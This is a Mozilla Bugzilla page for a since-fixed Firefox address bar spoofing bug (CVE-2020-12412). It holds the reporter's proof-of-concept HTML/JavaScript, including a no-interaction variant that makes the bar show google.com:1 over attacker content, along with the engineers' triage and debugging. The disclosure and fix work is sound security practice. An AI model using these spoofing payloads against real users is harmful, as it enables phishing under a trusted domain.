=== Content from bugzilla.mozilla.org_d1637b21_20250121_020906.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1528587)
* [XML](/show_bug.cgi?ctype=xml&id=1528587)

Closed
[Bug 1528587](/show_bug.cgi?id=1528587)
(CVE-2020-12412)

Opened 6 years ago
Closed 5 years ago

# Address bar spoof using history navigation and blocked ports

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Address bar spoof using history navigation and blocked ports

## Categories

### (Core :: DOM: Navigation, defect, P2)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Navigation#DOM%3A%20Navigation)

DOM: Navigation
▾

Core :: DOM: Navigation
For bugs with HTML’s [navigate](https://html.spec.whatwg.org/multipage/browsing-the-web.html#navigate) algorithm and browsing contexts.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Navigation&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Navigation&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Navigation)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P2

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla70

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [-](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=-) | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix) |
| firefox69 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | [-](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed) |
| firefox71 | [-](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed) |
| firefox72 | [-](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fixed) |
| firefox73 | [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr68 | - | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox69 |  | wontfix |
| firefox70 | - | fixed |
| firefox71 | - | fixed |
| firefox72 | - | fixed |
| firefox73 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: oess44, Assigned: peterv)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/21a031df69f8c0549475a8cdc06f53f5?d=mm&size=40)  [peterv](/user_profile?user_id=24295)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/ebd289225f34c1fcb5b4030a077b12db?d=mm&size=40)  [oess44](/user_profile?user_id=633720)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/5111b810214a00377104f5ad3efefa26?d=mm&size=40)  [sefeng](/user_profile?user_id=625922)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

18 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-spoof, reporter-external, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-12412

[Keywords:](/describekeywords.cgi)

[csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a34003227_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 1 obsolete file)

| [mozilla-firefox.zip](/attachment.cgi?id=9044466)  [6 years ago](#c0)  [Adrian](/user_profile?user_id=633720)   414.92 KB, application/x-zip-compressed |  | [Details](/attachment.cgi?id=9044466&action=edit) |
| --- | --- | --- |
| [poc-video.mp4](/attachment.cgi?id=9047475)  [6 years ago](#c11)  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)   266.85 KB, video/mp4 |  | [Details](/attachment.cgi?id=9047475&action=edit) |
| [mozilla-report.pdf](/attachment.cgi?id=9047476)  [6 years ago](#c12)  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)   216.12 KB, application/pdf |  | [Details](/attachment.cgi?id=9047476&action=edit) |
| [poc-no-user-interaction.mkv](/attachment.cgi?id=9054357)  [6 years ago](#c16)  [Adrian](/user_profile?user_id=633720)   264.38 KB, video/x-matroska |  | [Details](/attachment.cgi?id=9054357&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1528587#c0)• 6 years ago |
|  | |

Attached file
[mozilla-firefox.zip](attachment.cgi?id=9044466) (obsolete)
— [Details](attachment.cgi?id=9044466&action=edit)

Address Bar Spoofing security issue was tested against newest version of Mozilla Firefox. Both Linux and Windows version were behaving the same way which means both of them are vulnerable. I have tested it on 64bit Operating Systems(Ubuntu 16.04 and Windows 7). Client itself was 64bit as well. I have attached zip file containing report with the vulnerability details including poc code and short mp4 video. Please contact me via: oess44@gmail.com. Regards

Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1528587#c1)• 6 years ago |
|  | |

Description:

> 1. Victim opens attacker website
> 2. Attacker website opens restricted address such as <https://google.com:1>
>
>    in a new tab
> 3. Attacker website opens another attacker resource such as
>
>    attacker.com/test.html in the previously opened tab(this resource is
>
>    running actual javascript code leading to Address Bar Spoofing)
> 4. Attacker website opens another restricted address such as
>
>    <https://dontdoit.com:1> in the previously opened tab
>
>    When victim clicks back button just few times he will see <https://google.com:1>
>
>    in Address Bar and the content will be attacker controlled.
>
>    Following is a proof of concept html code included:

PoC in the pdf in the zipfile:

attacker.html

```
<!DOCTYPE html>
<html>
<body>
<script>
win=window.open(“https://google.com:1”);
setTimeout(‘win.location=”http://attackerip/test.html”',100);
setTimeout(‘win.location=”https://dontdoit.com:1”',300);
</script>
</body>
</html>

```

test.html

```
<!DOCTYPE html>
<html>
<body>
<p>Hello World</p>
<script>
setTimeout(‘window.history.go(-1); window.history.go(1);’ 500);
</script>
</body>
</html>

```

I haven't tried to reproduce yet because the steps combined with the code don't make a lot of sense to me. What's the relevance of "dontdoit.com" ? And in your testing, does the webpage's history navigation suffice here, or does the user still need to hit the back button themselves?

Component: Security → Address BarFlags: needinfo?(oess44)Summary: Full Address Bar Spoofing has been identified. It is possible to spoof any domain name either with http or https protocol. → Address bar spoof using history navigation and unreachable ports

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1528587#c2)• 6 years ago |
|  | |

Hi,

Methodology used in my attack is based on the fact Firefox is confused when the history chain looks like this:

Restricted Address like <https://google.com:1> -> legit address -> Restricted address like <https://dontdoit.com:1>

The relevance of the "dontdoit.com" is crucial because attack would otherwise not work. Please take a look at the video proof of concept. Answering your last question, user needs to hit the back button themselves. I have tried to automate it to the maximum it seems though that this last steps needs to be performed by victim(he needs to click back button)

If you want to reproduce it manually you can follow these steps:

create test.html

...

<button onclick="poc()">Click me to confuse firefox</button>

<script>

function poc() {

window.history.go(-1);

window.history.go(1);

}

</script>

...

1: type <https://google.com:1> in Address Bar

2: type <http://localhost/test.html> in Address Bar

3: type <https://whatever.com:1> in Address Bar

4: Click back button

5: Click "Click me to confuse firefox" button

6: Click back button

7: Click back button

This is how it can be done manually. You will see that the Address Bar is showing <https://google.com:1> with the attacker controlled content. Most of these steps can be automated however as shown in my first report.

Flags: needinfo?(oess44)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1528587#c3)• 6 years ago |
|  | |

Hi team

Its almost a week with no information from your side. Please let me know if you're working on it. It would be great to get in touch with you, maybe even cooperate in order to fix the issue. I think that the issue I have posted is worth investigation rather than ignoring it. Regards

Flags: needinfo?(mak77)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a324077_633720)• 6 years ago |

CC list accessible: false

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1528587#c4)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1528587&comment_id=13937835 "1 revision") |
|  | |

(In reply to Adrian from [comment #3](/show_bug.cgi?id=1528587#c3 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Hi team
>
> Its almost a week with no information from your side

It really hasn't. This was reported just under 4 days ago on bugzilla, and I responded 2 days ago. I don't understand why you think there's been no information.

Please do not make this bugreport inaccessible to people on the CC list again as you did just now (I'm reverting that change). It stops some people (like the person you asked for needinfo...) from seeing the bug / any requests.

I just tried to reproduce the issue and could not. I get an error page when opening <https://google.com:1/> that says:

"This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection."

Are you actually testing on port 1, or did you modify the testcase before submitting without retesting?

CC list accessible: trueFlags: needinfo?(oess44)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1528587#c5)• 6 years ago |
|  | |

> maybe even cooperate in order to fix the issue.

Did you have suggestions? Does the same issue appear in other browsers?

|  | [Marco Bonardo [:mak]](/user_profile?user_id=240353) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1528587#c6)• 6 years ago |
|  | |

Security should flag the right severity of this before we assign a proper priority.

Would you mind attaching the full set of html files ready to reproduce the bug, those would help with QA and with reproducing on other browsers.

Flags: needinfo?(mak77)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1528587#c7)• 6 years ago |
|  | |

There are two files required. The methodology have been already described including how to achieve the goal manually. I will describe it shortly again however.

test1.html

<!DOCTYPE html>

<html>

<body>

<script>

win=window.open("<https://google.com:1>");

setTimeout('win.location="[http://attackerip/test2.html"',100](http://attackerip/test2.html%22%27%2C100));

setTimeout('win.location="[https://whatever.com:1"',300](https://whatever.com:1%22',300));

</script>

</body>

</html>

test2.html

<!DOCTYPE html>

<html>

<body>

<p>Hello World</p>

<script>

setTimeout('window.history.go(-1); window.history.go(1);' 500);

</script>

</body>

</html>

The poc should work like that: Attacker send victim link to the test.html file. This file is opening <https://google.com:1> in a new tab, after 100 ms test2.html is being opened in the same tab and finally another restricted address is opened in the same tab: <https://whatever.com:1>

When user now click back button he will be on test2.html page which is running

setTimeout('window.history.go(-1); window.history.go(1);' 500);

After that when user clicks back button again just few times he will see <https://google.com:1> in Address Bar with the attacker controlled content. Please let me know if you succeeded to reproduce it. I will appreciate any information. Regards

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1528587#c8)• 6 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #4](/show_bug.cgi?id=1528587#c4 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> I just tried to reproduce the issue and could not. I get an error page when opening <https://google.com:1/> that says:
>
> "This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection."
>
> Are you actually testing on port 1, or did you modify the testcase before submitting without retesting?

Adrian, can you respond to this question please?

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1528587#c9)• 6 years ago |
|  | |

It can be any port which makes firefox returning:

"This address is restricted

This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection."

I have noticed that port number 1 is applicable. Port 123 seems to be right as well. The vulnerability occurs only when we got history chain looking like that: Restricted address -> attacker -> Restricted address. Please try to reproduce it manually first. Previously I have described all the steps required to do it manually. You will then understand correctly my methodology, why am I using two html files, why those ports are used and why history.go methods are used. Answering your last question I have tested it both with port 1 and 123 and it worked.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1528587#c10)• 6 years ago |
|  | |

OK, so the automated testcase with 2 files just doesn't work for me. First of all, there's a comma missing in your `setTimeout` call in `test.html`, but even when I fix that I can't reproduce. I end up with a tab that just knows about google.com:1 and otherdomain.com:1, and nothing else, and shows only error pages. I'm guessing the timings need tweaking.

Anyway, I can reproduce (on beta 66) when using the manual steps. Copying from [comment #2](/show_bug.cgi?id=1528587#c2 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") and fixing up some markup here:

Create test file and serve over http (e.g. localhost):

```
<button onclick="poc()">Click me to confuse firefox</button>
<script>
function poc() {
window.history.go(-1);
window.history.go(1);
}
</script>

```

0. new tab
1. navigate to <https://google.com:1> from the address bar
2. navigate to the test file in the same tab.
3. navigate to <https://whatever.com:1> from the address bar in the same tab.
4. Click back button (now you're back on the test page)
5. Click "Click me to confuse firefox" button in page content. You go forward to whatever.com:1 again.
6. Click back button (now you're back on the test page)
7. Click back button (now you're... still on the test page, but the location bar says you're at google.com:1 )

After these steps, the web console says:

```
> document.baseURI
"http://localhost/blah/blah/blah/blah/testpage.html"

document.location.href
"https://google.com:1/"

```

so docshell is confused. `gBrowser.selectedBrowser.currentURI` also points to google.com:1 . The node principal of the document is correct, as is the parent process browser's idea of the content principal (so no XSS or whatever) - but the current URI and window.location are wrong. So docshell is confused, and the address bar is mirroring that confusion. I'm guessing the error page loads are confusing session history somehow.

:qdot, can you take a look? (bz, olli, if you want to chime in please do)

Group: firefox-core-security → dom-core-securityStatus: UNCONFIRMED → NEWComponent: Address Bar → Document NavigationEver confirmed: trueFlags: needinfo?(oess44) → needinfo?(kyle)Product: Firefox → CoreSummary: Address bar spoof using history navigation and unreachable ports → Address bar spoof using history navigation and blocked ports

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1528587#c11)• 6 years ago |
|  | |

Attached video
[poc-video.mp4](attachment.cgi?id=9047475)
— [Details](attachment.cgi?id=9047475&action=edit)

[Attachment #9044466](/attachment.cgi?id=9044466&action=edit "mozilla-firefox.zip") -
Attachment is obsolete: true

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1528587#c12)• 6 years ago |
|  | |

Attached file
[mozilla-report.pdf](attachment.cgi?id=9047476)
— [Details](attachment.cgi?id=9047476&action=edit)

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a1437873_424719)• 6 years ago |

Flags: needinfo?(kyle)

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1528587#c13)• 6 years ago |
|  | |

Re-ni'ing myself, didn't mean to mark that.

Flags: needinfo?(kyle)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1528587#c14)• 6 years ago |
|  | |

Hi Team,

Have you managed to assign proper severity? According to Firefox Release Calendar a new version is planned to be released in a matter of 7 days. Would be great to know if my finding qualify for CVE or something. Regards

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1528587#c15)• 6 years ago |
|  | |

This bug will definitely not be fixed in next week's release. That's been locked down and in testing for a while.

Keywords: [csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1528587#c16)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1528587&comment_id=14018526 "2 revisions") |
|  | |

Attached video
[poc-no-user-interaction.mkv](attachment.cgi?id=9054357)
— [Details](attachment.cgi?id=9054357&action=edit)

Hi Team,

I have developed slightly modified version of my exploit. It turned out there is no user interaction needed at all. This Attack could have been used for a mass pwnage. It is only required victim visits specially crafted website. Please take it into account. I have attached another video with the proof. Following is the code I am using now. The timings is here adjusted to high values just in order to show you each steps. I am using three html files: test.html, test2.html and test3.html

Victim is only required to open test2.html file.

test2.html:

```
<html>
</body>
<script>
    win = window.open("https://google.com:1");
    setTimeout('win.location = "http://localhost/"', 2000);
    setTimeout('win.location = "http://testtest.com:1"', 4000);
    setTimeout('win.location = "http://localhost/exploring/test.html"', 6000);
    setTimeout('win.location.replace("http://localhost/exploring/test3.html");', 8000)
</script>
</body>
</html>

```

test.html

```
<html>
<body>
<script>
    setTimeout('window.history.go(-3); window.history.go(-1);', 250);
</script>
</body>
</html>

```

test3.html:

```
<html>
<p>THIS IS PARAGRAPH</p>
<a href="http://abcd.abcde" id=mylink>link</a>
<script>
    window.history.go(-2);
</script>
</html>

```

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1528587#c17)• 6 years ago |
|  | |

This is the correct version, sorry for bothering you, but I have mistakenely made a typo error and I just wanted to post a valid code so this is the reason for another comment.

(In reply to Adrian from [comment #16](/show_bug.cgi?id=1528587#c16 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Created [attachment 9054357](/attachment.cgi?id=9054357 "poc-no-user-interaction.mkv") [[details]](/attachment.cgi?id=9054357&action=edit "poc-no-user-interaction.mkv")
>
> poc-no-user-interaction.mkv
>
> Hi Team,
>
> I have developed slightly modified version of my exploit. It turned out there is no user interaction needed at all. This Attack could have been used for a mass pwnage. It is only required victim visits specially crafted website. Please take it into account. I have attached another video with the proof. Following is the code I am using now. The timings is here adjusted to high values just in order to show you each steps. I am using three html files: test.html, test2.html and test3.html
>
> Victim is only required to open test2.html file.
>
> test2.html:
>
> <html>
>
> <body>
>
> </script>
>
> win = window.open("<https://google.com:1>");
>
> setTimeout('win.location = "<http://localhost/>"', 2000);
>
> setTimeout('win.location = "<http://testtest.com:1>"', 4000);
>
> setTimeout('win.location = "<http://localhost/exploring/test.html>"', 6000);
>
> setTimeout('win.location.replace("<http://localhost/exploring/test3.html>")', 8000);
>
> </script>
>
> </body>
>
> </html>
>
> test.html
>
> <html>
>
> <body>
>
> <script>
>
> setTimeout('window.history.go(-3); window.history.go(-1);', 250);
>
> </script>
>
> </body>
>
> </html>
>
> test3.html:
>
> <html>
>
> <p>THIS IS PARAGRAPH</p>
>
> <a href="<http://abcd.abcde>" id=mylink>link</a>
>
> <script>
>
> window.history.go(-2);
>
> </script>
>
> </html>

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1528587#c18)• 6 years ago |
|  | |

Hi,

It is almost 3 weeks without any information. 4 days ago I have attached video poc along with code proving that no user interaction is needed to perform the attack. Given the fact my technique is working on almost every Firefox release to date it would be great to know the proper severity now. Eventually I would really appreciate any info regarding planned fix/patch date. Is it possible for you to deliver it before next major release?

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a4736238_424719)• 6 years ago |

Flags: needinfo?(kyle)

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1528587#c19)• 6 years ago |
|  | |

Ugh was updating CC list while discussing this with someone and un'ni'd myself again. Looking at some of the potential session history issues.

Flags: needinfo?(kyle)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1528587#c20)• 6 years ago |
|  | |

I couldn't reproduce with the automated testcases, but the steps from [comment 10](/show_bug.cgi?id=1528587#c10 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") work for me.

So far it looks like session history is passing the right info into nsDocShell, trying to figure out what goes wrong next.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1528587#c21)• 6 years ago |
|  | |

Actually, I take that back. The URI in the session history entry is "<https://google.com:1/>", but its shared entry's document looks to be for the poc.html file.

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1528587#c22)• 6 years ago |
|  | |

In order to reproduce the issue with automated testcase it is necessary to serve those 3 html files. My poc proving there is no user interaction needed is composed of three html files. And it works like a charm for me every time. I have also provided video "poc-no-user-interaction.mkv" showing exact steps. If you're having some troubles though please ensure you're doing it this way:

1. Install some kind of webserver, I have tested it using apache2 for Linux
2. copy following three html files to one location. I have created directory named "poc" under which all html files are served

test2.html

<!DOCTYPE html>

<html>

<body>

<p>THIS IS POC</p>

<script>

win = window.open("<https://google.com:1>");

setTimeout('win.location = "<http://localhost/>"', 1000);

setTimeout('win.location = "<http://testtest.com:1>"', 2500);

setTimeout('win.location = "<http://localhost/poc/test.html>"', 3500);

setTimeout('win.location.replace("<http://localhost/poc/test3.html>");', 4500);

</script>

</body>

</html>

test3.html

<!DOCTYPE html>

<html>

<script>

window.history.go(-2);

</script>

</html>

test.html

<!DOCTYPE html>

<html>

<body>

<p>Hello World this is my Content</p>

<script>

setTimeout('window.history.go(-3); window.history.go(-1);', 250);

</script>

</body>

</html>

3. Open web browser, and type <http://youraddr/poc/test2.html> into the address bar then click enter to load the resource. I created directory "poc" which is hosting my html files and so I am invoking test2.html like that:

   <http://localhost/poc/test2.html>
4. The result should be <https://google.com:1> in the address bar of new tab and the content of test.html file. Please let me know if you managed to reproduce it.

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a6922447_424719)• 6 years ago |

Flags: needinfo?(kyle)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1528587#c23)• 6 years ago |
|  | |

Hi,

Can anybody please answer few questions?

1: Is this vulnerability getting any attention?

2: Does it qualify for CVE/bounty ?

3: When you're planning to release the patch?

4: Why almost 90 days its not enough to fix the issue?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1528587#c24)• 6 years ago |
|  | |

Neha, radar'ing this to you - can you help move this forward? Thanks.

Flags: needinfo?(nkochar)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1528587#c25)• 6 years ago |
|  | |

I have been trying to figure out what's going wrong, it's just complicated to figure out even with rr.

The viewer of the second load is set on the entry for the first load, by nsDocumentViewer::Destroy using its mSHEntry. The entry for the first load is set on the viewer for the second load in nsDocumentViewer::Close, where we set that mSHEntry. That nsDocumentViewer::Close call comes from nsDocShell::SetupNewViewer. I think that the mContentViewer of that nsDocShell is for the second load at that point, but the mOSHE is for the first load. I think I've found the point where we set the mOSHE. Next is determining why we set mOSHE to the entry for the first load even though the viewer is for the second load.

Assignee: nobody → petervFlags: needinfo?(nkochar)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1528587#c26)• 6 years ago |
|  | |

(In reply to Adrian from [comment #23](/show_bug.cgi?id=1528587#c23 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> 1: Is this vulnerability getting any attention?

Yes.

> 2: Does it qualify for CVE/bounty ?

That's for the security team to determine, sec-moderate bugs don't automatically qualify for a bounty iirc.

`

> 3: When you're planning to release the patch?

When we actually have a patch to release :-).

> 4: Why almost 90 days its not enough to fix the issue?

We're trying to fix it, but it's complicated to figure out what exactly is going wrong.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1528587#c27)• 6 years ago |
|  | |

Here's what I think is happening when we're executing the two lines:

```
window.history.go(-1);
window.history.go(1);

```

